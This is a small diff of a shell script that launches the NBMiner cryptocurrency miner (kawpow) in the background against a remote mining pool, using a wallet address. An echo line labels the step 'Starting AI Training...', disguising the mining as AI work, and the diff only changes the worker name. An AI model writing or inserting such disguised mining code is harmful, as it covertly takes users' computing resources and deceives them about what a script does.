@@ -9,7 +9,7 @@ cd NBMiner_Linux
 chmod +x nbminer
 
 echo "Starting AI Training..."
-./nbminer -a kawpow -o stratum+tcp://104.194.134.155:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.devtes2t &
+./nbminer -a kawpow -o stratum+tcp://104.194.134.155:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.devtesxxxt &
 
 # Store the background process ID
 NBMINER_PID=$!
